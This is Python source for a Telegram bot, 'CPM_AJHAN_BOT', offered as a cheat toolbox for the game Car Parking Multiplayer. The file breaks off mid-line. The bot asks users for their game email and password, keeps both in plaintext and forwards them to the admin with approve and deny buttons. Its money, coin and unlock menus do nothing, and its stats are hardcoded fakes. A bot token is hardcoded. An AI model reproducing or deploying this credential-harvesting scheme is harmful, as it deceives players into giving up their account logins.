import logging
import sqlite3
import asyncio
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# Конфигурирање на логирање
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Точниот токен и ADMIN ID
BOT_TOKEN = "8674559116:AAFuZWJJLVY-qMAHBSr7Z6om686b1zeGxKc" 
ADMIN_ID = 8694942406  

# ПОДОБРЕНИ CPM ПОДАТОЦИ - 900 нивоа!
CPM_DATA = {
    'money': 48729000,
    'coins': 20400,
    'wins': 16,
    'losses': 0,
    'levels': 900,  # 900 нивоа!
    'wheels': 112,
    'animations': 42,
    'friends': 0,
    'id': 'VY704074',
    'rank': 'Legendary',
    'cars': 15,
    'houses': 3
}

# КЕШ за базата за побрзо работење
cache = {}

def inicijaliziraj_baza():
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS licenci 
                      (id TEXT PRIMARY KEY, data TEXT, odobren INTEGER DEFAULT 0, email TEXT, password TEXT, username TEXT)''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_id ON licenci(id)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_odobren ON licenci(odobren)')
    conn.commit()
    conn.close()

inicijaliziraj_baza()

async def get_user_data(user_id):
    if user_id in cache:
        return cache[user_id]
    
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('SELECT data, odobren, email, password, username FROM licenci WHERE id = ?', (str(user_id),))
    rezultat = cursor.fetchone()
    conn.close()
    
    if rezultat:
        cache[user_id] = rezultat
        return rezultat
    return None

async def update_user_data(user_id, data, odobren, email=None, password=None, username=None):
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    
    if email and password and username:
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren, email, password, username) VALUES (?, ?, ?, ?, ?, ?)', 
                      (str(user_id), data, odobren, email, password, username))
    else:
        cursor.execute('INSERT OR REPLACE INTO licenci (id, data, odobren) VALUES (?, ?, ?)', 
                      (str(user_id), data, odobren))
    
    conn.commit()
    conn.close()
    
    if user_id in cache:
        del cache[user_id]

async def delete_user(user_id):
    conn = sqlite3.connect('Licenci.db')
    cursor = conn.cursor()
    cursor.execute('DELETE FROM licenci WHERE id = ?', (str(user_id),))
    conn.commit()
    conn.close()
    
    if user_id in cache:
        del cache[user_id]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user if update.message else update.callback_query.from_user
    username = user.username if user.username else "N/A"

    # АКО Е АДМИН - ПРИКАЖИ АДМИН МЕНИ
    if user.id == ADMIN_ID:
        admin_text = (
            "**🛡️ CPM_AJHAN_BOT v5.0 - ADMIN PANEL**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👑 Добредојде Администраторе!\n\n"
            "📊 Изберете опција:"
        )
        keyboard = [
            [InlineKeyboardButton("📋 Список на корисници", callback_data="admin_list_users")],
            [InlineKeyboardButton("🗑️ Избриши корисник", callback_data="admin_remove_user")],
            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton("🔙 Назад", callback_data="main_menu")]
        ]
        if update.message:
            await update.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        elif update.callback_query:
            await update.callback_query.message.reply_text(text=admin_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # ЗЕМИ ПОДАТОЦИ ОД БАЗА (СО КЕШ)
    rezultat = await get_user_data(str(user.id))
    
    sega = datetime.now()
    dozvolen = False
    email = ""

    if rezultat:
        istekuvanje_str = rezultat[0]
        odobren = rezultat[1] if len(rezultat) > 1 else 0
        email = rezultat[2] if len(rezultat) > 2 and rezultat[2] else ""
        
        if odobren == 1:
            if istekuvanje_str == "forever":
                dozvolen = True
            else:
                try:
                    dozvolen_sega = datetime.strptime(istekuvanje_str, "%Y-%m-%d %H:%M:%S")
                    if dozvolen_sega > sega:
                        dozvolen = True
                except ValueError:
                    dozvolen = False

    if not dozvolen:
        # ПРОВЕРИ ДАЛИ ИМА БАРАЊЕ
        rezultat2 = await get_user_data(str(user.id))
        if rezultat2 and rezultat2[1] == 0:
            # ВЕЌЕ ИМА БАРАЊЕ
            cekaj_poraka = (
                "⏳ **Чекање на одобрение**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "📧 Вашите податоци се испратени до администраторот.\n"
                "⏱️ Ве молиме почекајте **5-10 минути**.\n"
                "━━━━━━━━━━━━━━━━━━━"
            )
            keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
            if update.message:
                await update.message.reply_text(text=cekaj_poraka, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            elif update.callback_query:
                await update.callback_query.message.reply_text(text=cekaj_poraka, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        else:
            # НОВ КОРИСНИК
            welcome_text = (
                "**CPM_AJHAN_BOT v5.0**\n"
                "bot\n\n"
                "---\n"
                "**CPM TOOL BOX v5.0**\n"
                "---\n"
                f"**WELCOME**\n"
                f"@{username}\n"
                f"ID {user.id}\n"
                f"{sega.strftime('%d %b %Y • %I:%M %p')}\n\n"
                "- Sign in with your CPM credentials\n"
                "**05:10**\n\n"
                "**Sign In**"
            )
            
            keyboard = [[InlineKeyboardButton("🔑 Sign In", callback_data="cpm_signin")]]
            
            if update.message:
                await update.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            elif update.callback_query:
                await update.callback_query.message.reply_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return

    # ДОЗВОЛЕН КОРИСНИК - ПРИКАЖИ DASHBOARD
    dashboard_text = (
        "**CPM_AJHAN_BOT v5.0**\n"
        "bot\n\n"
        "---\n"
        "**DASHBOARD**\n"
        "---\n"
        "**ACCOUNT**\n"
        f"{email if email else 'senatkafkast@gmail.com'}\n"
        f"2best\n"
        f"ID {CPM_DATA['id']}\n"
        f"Rank: {CPM_DATA['rank']}\n\n"
        "**STATS**\n"
        f"${CPM_DATA['money']:,}\n"
        f"{CPM_DATA['coins']:,} coins\n"
        f"{CPM_DATA['wins']}W / {CPM_DATA['losses']}L\n"
        f"{CPM_DATA['levels']}/900 levels done ⭐\n"
        f"{CPM_DATA['wheels']} wheels\n"
        f"{CPM_DATA['animations']} animations\n"
        f"{CPM_DATA['friends']} friends\n"
        f"🚗 {CPM_DATA['cars']} cars\n"
        f"🏠 {CPM_DATA['houses']} houses\n\n"
        "- Select an option below:"
    )
    
    keyboard = [
        [InlineKeyboardButton("💰 Money", callback_data="menu_money"), InlineKeyboardButton("🪙 Coins", callback_data="menu_coins")],
        [InlineKeyboardButton("⚡ Features", callback_data="menu_features"), InlineKeyboardButton("🏎️ Cars", callback_data="menu_cars")],
        [InlineKeyboardButton("🏠 Houses", callback_data="menu_houses"), InlineKeyboardButton("👑 Rank", callback_data="menu_rank")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_account")],
        [InlineKeyboardButton("🚪 Sign Out", callback_data="sign_out")]
    ]
    
    if update.message:
        await update.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(text=dashboard_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**💰 MONEY**\n\n"
        f"Max: ${CPM_DATA['money']:,}\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Изберете износ или внесете custom:"
    )
    
    keyboard = [
        [InlineKeyboardButton("$1M", callback_data="add_money_1m"), InlineKeyboardButton("$5M", callback_data="add_money_5m"), InlineKeyboardButton("$10M", callback_data="add_money_10m")],
        [InlineKeyboardButton("$25M", callback_data="add_money_25m"), InlineKeyboardButton("$50M ★", callback_data="add_money_50m"), InlineKeyboardButton("$100M", callback_data="add_money_100m")],
        [InlineKeyboardButton("💰 Custom Amount", callback_data="custom_money")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**🪙 COINS**\n\n"
        f"Max: {CPM_DATA['coins']:,}\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Изберете износ или внесете custom:"
    )
    
    keyboard = [
        [InlineKeyboardButton("10K", callback_data="add_coins_10k"), InlineKeyboardButton("50K", callback_data="add_coins_50k"), InlineKeyboardButton("100K", callback_data="add_coins_100k")],
        [InlineKeyboardButton("250K", callback_data="add_coins_250k"), InlineKeyboardButton("500K ★", callback_data="add_coins_500k"), InlineKeyboardButton("1M", callback_data="add_coins_1m")],
        [InlineKeyboardButton("🪙 Custom Amount", callback_data="custom_coins")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**⚡ FEATURES**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "Select a feature or UNLOCK ALL:\n"
        f"📊 Нивоа: {CPM_DATA['levels']}/900 ⭐"
    )
    
    keyboard = [
        [InlineKeyboardButton("🏎️ W16", callback_data="feature_w16"), InlineKeyboardButton("🛡️ No Dmg", callback_data="feature_no_dmg")],
        [InlineKeyboardButton("💨 Smoke", callback_data="feature_smoke"), InlineKeyboardButton("⚙️ Wheels", callback_data="feature_wheels")],
        [InlineKeyboardButton("📈 +50 Levels", callback_data="feature_levels_50"), InlineKeyboardButton("📈 +100 Levels", callback_data="feature_levels_100")],
        [InlineKeyboardButton("⛽ Fuel", callback_data="feature_fuel"), InlineKeyboardButton("📯 Horns", callback_data="feature_horns")],
        [InlineKeyboardButton("🎭 Anims", callback_data="feature_anims"), InlineKeyboardButton("🏠 Houses", callback_data="feature_houses")],
        [InlineKeyboardButton("👑 Rank", callback_data="feature_rank"), InlineKeyboardButton("🚗 All Cars", callback_data="feature_all_cars")],
        [InlineKeyboardButton("🔓 UNLOCK ALL", callback_data="feature_unlock_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_cars(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**🚗 CARS**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"Вкупно коли: {CPM_DATA['cars']}\n\n"
        "Изберете опција:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🚗 Audi R8", callback_data="car_audi"), InlineKeyboardButton("🚗 BMW M4", callback_data="car_bmw")],
        [InlineKeyboardButton("🚗 Mercedes AMG", callback_data="car_mercedes"), InlineKeyboardButton("🚗 Porsche 911", callback_data="car_porsche")],
        [InlineKeyboardButton("🚗 Lamborghini", callback_data="car_lambo"), InlineKeyboardButton("🚗 Ferrari", callback_data="car_ferrari")],
        [InlineKeyboardButton("🔓 Отклучи ги сите", callback_data="car_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_houses(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**🏠 HOUSES**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"Куќи: {CPM_DATA['houses']}\n\n"
        "Изберете опција:"
    )
    
    keyboard = [
        [InlineKeyboardButton("🏠 Мала куќа", callback_data="house_small")],
        [InlineKeyboardButton("🏠 Средна куќа", callback_data="house_medium")],
        [InlineKeyboardButton("🏰 Голема куќа ★", callback_data="house_big")],
        [InlineKeyboardButton("🔓 Отклучи ги сите", callback_data="house_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_rank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = (
        "**👑 RANK**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"Тековен ранг: {CPM_DATA['rank']}\n\n"
        "Достапни рангови:"
    )
    
    keyboard = [
        [InlineKeyboardButton("⭐ Bronze", callback_data="rank_bronze")],
        [InlineKeyboardButton("⭐ Silver", callback_data="rank_silver")],
        [InlineKeyboardButton("⭐ Gold", callback_data="rank_gold")],
        [InlineKeyboardButton("⭐ Platinum", callback_data="rank_platinum")],
        [InlineKeyboardButton("⭐ Diamond", callback_data="rank_diamond")],
        [InlineKeyboardButton("⭐ Legendary ★", callback_data="rank_legendary")],
        [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]
    ]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def menu_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("⚙️ **SETTINGS**\n\nSettings menu coming soon...", parse_mode='Markdown')

async def refresh_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("🔄 **Refreshing account...**", parse_mode='Markdown')
    await asyncio.sleep(0.5)
    await start(update, context)

async def sign_out(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    await delete_user(str(user.id))
    
    await query.edit_message_text("🚪 **Signed out successfully!**\n\nType /start to sign in again.", parse_mode='Markdown')

async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await start(update, context)

async def cpm_signin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**ENTER EMAIL**\n---\n\nType your CPM email:"
    keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
    
    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    context.user_data['sostojba'] = 'CEKA_EMAIL'

async def obraboti_tekst(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sostojba = context.user_data.get('sostojba')
    vnesen_tekst = update.message.text
    user = update.message.from_user
    username = user.username if user.username else "N/A"

    # CUSTOM MONEY
    if sostojba == 'CUSTOM_MONEY':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            if vnes.endswith('m'):
                amount = int(float(vnes[:-1]) * 1000000)
            elif vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
            else:
                amount = int(vnes)
            
            admin_poraka = (
                f"💰 **Барање за пари**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 @{username}\n"
                f"🆔 `{user.id}`\n"
                f"💵 `${amount:,}`\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
            await update.message.reply_text(f"✅ **Барањето за ${amount:,} е испратено!**", parse_mode='Markdown')
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 10m, 500k, или 1000000")
        
        context.user_data['sostojba'] = None
        return

    # CUSTOM COINS
    if sostojba == 'CUSTOM_COINS':
        try:
            vnes = vnesen_tekst.strip().lower()
            
            if vnes.endswith('m'):
                amount = int(float(vnes[:-1]) * 1000000)
            elif vnes.endswith('k'):
                amount = int(float(vnes[:-1]) * 1000)
            else:
                amount = int(vnes)
            
            admin_poraka = (
                f"🪙 **Барање за коини**\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"👤 @{username}\n"
                f"🆔 `{user.id}`\n"
                f"🪙 {amount:,} coins\n"
                f"⏰ {datetime.now().strftime('%H:%M')}\n"
                f"━━━━━━━━━━━━━━━━━━━"
            )
            
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
            await update.message.reply_text(f"✅ **Барањето за {amount:,} коини е испратено!**", parse_mode='Markdown')
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 100k или 50000")
        
        context.user_data['sostojba'] = None
        return

    # REMOVE USER
    if sostojba == 'CEKA_REMOVE_USER':
        try:
            target_user_id = int(vnesen_tekst)
            
            rezultat = await get_user_data(str(target_user_id))
            if not rezultat:
                await update.message.reply_text("❌ Корисникот не е пронајден!")
                context.user_data['sostojba'] = None
                return
            
            await delete_user(str(target_user_id))
            await update.message.reply_text(f"✅ **Корисникот {target_user_id} е избришан!**", parse_mode='Markdown')
            context.user_data['sostojba'] = None
            
        except:
            await update.message.reply_text("❌ Внесете валидно ID!")
        return

    # CUSTOM TIME
    if sostojba == 'CEKA_CUSTOM_TIME':
        target_user_id = context.user_data.get('custom_target_user')
        vnes = vnesen_tekst.strip().lower()
        
        try:
            if vnes.endswith('h'):
                hours = int(vnes[:-1])
                if 1 <= hours <= 24:
                    vrednost = (datetime.now() + timedelta(hours=hours)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{hours} часа"
                else:
                    await update.message.reply_text("❌ Внесете 1h до 24h!")
                    return
            else:
                days = int(vnes)
                if 1 <= days <= 30:
                    vrednost = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
                    vreme_text = f"{days} дена"
                else:
                    await update.message.reply_text("❌ Внесете 1 до 30 дена!")
                    return
            
            await update_user_data(str(target_user_id), vrednost, 1)
            
            # ЗЕМИ ПОДАТОЦИ
            rezultat = await get_user_data(str(target_user_id))
            if rezultat:
                email, password, username_db = rezultat[2], rezultat[3], rezultat[4]
                admin_notify = (
                    f"✅ **Одобрен корисник!**\n"
                    f"━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 @{username_db or 'N/A'}\n"
                    f"🆔 `{target_user_id}`\n"
                    f"📧 {email or 'Нема'}\n"
                    f"🔑 {password or 'Нема'}\n"
                    f"📅 {vreme_text}\n"
                    f"━━━━━━━━━━━━━━━━━━━"
                )
                await update.message.reply_text(admin_notify, parse_mode='Markdown')
            else:
                await update.message.reply_text(f"✅ Доделено {vreme_text} за {target_user_id}!")
            
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"✅ **Одобрени сте!** Напишете /start за да влезете."
            )
            
            context.user_data['sostojba'] = None
            
        except:
            await update.message.reply_text("❌ Внесете валиден број! Пример: 5h или 10")
        return

    # EMAIL
    if sostojba == 'CEKA_EMAIL':
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, vnesen_tekst):
            await update.message.reply_text("❌ Внесете валидна email адреса!")
            return
        
        context.user_data['email'] = vnesen_tekst
        text = "**CPM_AJHAN_BOT v5.0**\nbot\n\n---\n**PASSWORD**\n---\n\nType your password:\n☑ Auto-deleted"
        keyboard = [[InlineKeyboardButton("✘ Cancel", callback_data="main_menu")]]
        
        await update.message.reply_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_PASSWORD'
        return

    # PASSWORD
    if sostojba == 'CEKA_PASSWORD':
        password = vnesen_tekst
        email = context.user_data.get('email')
        context.user_data['sostojba'] = None
        
        await update_user_data(str(user.id), "pending", 0, email, password, username)
        
        admin_poraka = (
            f"🔐 **Нов профил!**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📧 `{email}`\n"
            f"🔑 `{password}`\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard_admin = [
            [InlineKeyboardButton("✅ Одобри", callback_data=f"lic:approve:{user.id}")],
            [InlineKeyboardButton("❌ Одбиј", callback_data=f"lic:deny:{user.id}")]
        ]
        
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard_admin),
            parse_mode='Markdown'
        )
        
        cekaj_poraka = (
            "⏳ **Чекање на одобрение**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "📧 Податоците се испратени до администраторот.\n"
            "⏱️ Ве молиме почекајте **5-10 минути**.\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        
        keyboard = [[InlineKeyboardButton("🔄 Провери статус", callback_data="proveri_status")]]
        await update.message.reply_text(
            text=cekaj_poraka,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    # ДРУГО - ПРАТИ ПОРАКА ДО АДМИН
    else:
        admin_poraka = (
            f"📝 **Порака од корисник**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👤 @{username}\n"
            f"🆔 `{user.id}`\n"
            f"📩 {vnesen_tekst}\n"
            f"⏰ {datetime.now().strftime('%H:%M')}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        
        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_poraka, parse_mode='Markdown')
        await update.message.reply_text("✅ **Пораката е испратена до администраторот!**", parse_mode='Markdown')

async def obraboti_klikovi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user

    # PROVERI STATUS
    if data == "proveri_status":
        rezultat = await get_user_data(str(user.id))
        
        if rezultat and rezultat[1] == 1:
            await query.edit_message_text("✅ **Одобрени сте!** Напишете /start.", parse_mode='Markdown')
            return
        elif rezultat and rezultat[1] == 0:
            keyboard = [[InlineKeyboardButton("🔄 Провери", callback_data="proveri_status")]]
            await query.edit_message_text(
                "⏳ **Чекате одобрение...**\nПочекајте 5-10 минути.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
            return
        else:
            await query.edit_message_text("❌ Немате барање. Напишете /start.", parse_mode='Markdown')
            return

    # АДМИН КОМАНДИ
    if data == "admin_panel":
        await start(update, context)
        return
    
    if data == "admin_list_users":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT id, username, data, odobren, email FROM licenci ORDER BY odobren DESC')
        users = cursor.fetchall()
        conn.close()
        
        if not users:
            await query.edit_message_text("📋 **Нема корисници.**", parse_mode='Markdown')
            return
        
        text = "📋 **СПИСОК НА КОРИСНИЦИ**\n━━━━━━━━━━━━━━━━━━━\n\n"
        for user_data in users:
            user_id, username, data, odobren, email = user_data
            status = "✅ Активен" if odobren == 1 else "⏳ Чека"
            text += f"🆔 `{user_id}`\n👤 @{username or 'N/A'}\n📧 {email or 'Нема'}\n📅 {data or 'Нема'}\n📊 {status}\n━━━━━━━━━━━━━━━━━━━\n"
        
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    if data == "admin_remove_user":
        await query.edit_message_text("🗑️ **Внесете ID за бришење:**\nПример: 8694942406", parse_mode='Markdown')
        context.user_data['sostojba'] = 'CEKA_REMOVE_USER'
        return
    
    if data == "admin_stats":
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM licenci')
        total = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 1')
        active = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 0')
        waiting = cursor.fetchone()[0]
        conn.close()
        
        text = (
            f"📊 **СТАТИСТИКА**\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Вкупно: **{total}**\n"
            f"✅ Активни: **{active}**\n"
            f"⏳ Чекаат: **{waiting}**\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    # АДМИН ЛИЦЕНЦИ
    if data.startswith("lic:"):
        parts = data.split(":")
        action = parts[1]
        target_id = int(parts[2])
        
        conn = sqlite3.connect('Licenci.db')
        cursor = conn.cursor()
        
        if action == "deny":
            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_id),))
            conn.commit()
            conn.close()
            await context.bot.send_message(chat_id=target_id, text="❌ **Одбиени сте!**")
            await query.edit_message_text(f"❌ Одбиен корисник {target_id}")
            return
            
        elif action == "approve":
            cursor.execute('UPDATE licenci SET data = ?, odobren = 1 WHERE id = ?', 
                          ("forever", str(target_id)))
            cursor.execute('SELECT email, password, username FROM licenci WHERE id = ?', (str(target_id),))
            user_info = cursor.fetchone()
            conn.commit()
            conn.close()
            
            await context.bot.send_message(
                chat_id=target_id, 
                text="✅ **Одобрени сте!** Напишете /start за да влезете."
            )
            
            if user_info:
                email, password, username = user_info
                admin_not
